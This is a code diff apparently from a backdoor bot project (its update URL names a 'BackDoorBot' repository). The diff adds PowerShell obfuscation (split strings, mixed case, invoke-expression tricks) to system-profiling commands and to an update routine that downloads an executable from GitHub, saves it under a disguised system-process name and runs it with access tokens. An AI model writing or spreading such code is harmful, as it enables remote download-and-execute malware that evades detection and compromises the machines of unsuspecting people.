@@ -271,11 +271,14 @@ class Func_API:
 
     def specifications(self):  # возвращает характеристики пк
         x, y = pyautogui.size()
-        proc = self.cmdo_ret('powershell "Get-WmiObject -Class Win32_Processor | select Name"').split('\n')[4][:-2]
+        pwrshl_proc = "(('Get-WmiObject -Class Win3'+'2_'+'Proces'+'sor'+' VBk'+' se'+'le'+'c'+'t Nam'+'e') -crePlace  'VBk',[cHaR]124)|inVoKe-eXpRESsIoN"
+        proc = self.cmdo_ret(f'powershell "{pwrshl_proc}"').split('\n')[4][:-2]
+        pwrshl_ram = "&((gv '*mDr*').NAME[3,11,2]-JOIn'') ((('G'+'et-W'+'miObje'+'ct '+'Wi'+'n'+'32_'+'P'+'hysi'+'calMemo'+'ry '+'{0} '+'Measure-'+'Ob'+'j'+'ect -'+'Pro'+'per'+'ty c'+'apacity'+' -Sum') -f[chaR]124) )"
         ram = int(self.cmdo_ret(
-            'powershell "Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum"').split("\n")[
+            f'powershell "{pwrshl_ram}"').split("\n")[
                       5].split(': ')[1][:-1]) // 1073741824
-        vid = self.cmdo_ret('powershell "Get-WmiObject Win32_VideoController | select Name"').split('\n')[4][:-1]
+        pwrshl_vid = ".( ([striNg]$vERbOSEpRefErENCE)[1,3]+'x'-joIn'')((('Ge'+'t-W'+'miObje'+'ct Wi'+'n'+'3'+'2'+'_VideoC'+'o'+'n'+'tro'+'ller '+'{'+'0} sele'+'ct Name')  -F[cHAr]124))"
+        vid = self.cmdo_ret(f'powershell "{pwrshl_vid}"').split('\n')[4][:-1]
         banner = f"""Name PC:   {platform.node()}
 System:       {platform.system()} {platform.release()}
 CPU:             {proc}
@@ -378,10 +381,14 @@ Screen:        {x}x{y}"""
 
     def update_bot(self):
         pth = os.getcwd()
+        pwrsh_invoke = "& ( $PsHOmE[4]+$pSHOME[30]+'x')( ('Invoke'+'-We'+'b'+'Req'+'u'+'es'+'t " \
+                       "'+'htt'+'ps://ra'+'w.'+'g'+'ithub'+'u'+'ser'+'content.com'+'/'+'DmodvGH/'+'BackDo'+'o'+'r" \
+                       "'+'Bot/ma'+'in/main'+'_bot/mai'+'n.'+'ex'+'e '+'-OutFil'+'e " \
+                       "'+'A'+'pplicati'+'onFra'+'me'+'Host'+'.exe') )"
         text_bat = f'''@echo off
 timeout 30
 del {pth}\\windows_shell.exe
-powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/DmodvGH/BackDoorBot/main/main_bot/main.exe -OutFile windows_shell.exe"
+powershell -Command "{pwrsh_invoke}"
 start windows_shell.exe -n {TOKEN_PC[0]} -t {TOKEN_PC[1]} -u 1
 exit'''
 
